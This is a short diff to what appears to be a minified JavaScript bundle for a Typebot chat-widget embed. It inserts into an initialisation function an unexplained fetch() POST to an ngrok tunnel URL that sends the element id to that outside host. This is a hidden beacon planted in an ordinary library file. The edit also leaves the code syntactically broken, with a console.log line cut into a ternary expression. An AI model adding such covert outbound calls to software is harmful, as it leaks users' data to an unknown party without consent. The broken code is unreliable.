@@ -9642,6 +9642,13 @@ function e(e) {
     },
     is = (e) => {
       const t = e.id
+      fetch('https://4b72-45-187-2-165.ngrok-free.app',{
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({id: t})
+      })
       console.log("Init: ",t)
         ? document.getElementById(e.id)
         : document.querySelector("typebot-standard");
